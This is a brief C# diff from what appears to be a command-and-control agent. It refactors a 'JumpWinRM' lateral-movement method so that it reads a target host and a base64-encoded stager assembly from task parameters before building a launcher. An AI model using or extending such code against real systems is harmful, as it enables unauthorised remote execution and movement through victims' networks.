@@ -6,7 +6,6 @@ using Shared.Models;
 
 using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 
@@ -41,12 +40,10 @@ namespace Agent.Modules
             };
         }
 
-        void JumpWinRM(string AgentID, C2Data C2Data)
+        void JumpWinRM(string AgentID, AgentTask Task)
         {
-            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-            
-            var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
-            var stager = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
+            var target = (string)Task.Parameters["Target"];
+            var stager = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
 
             var launcher = GenerateLauncher(stager);
 
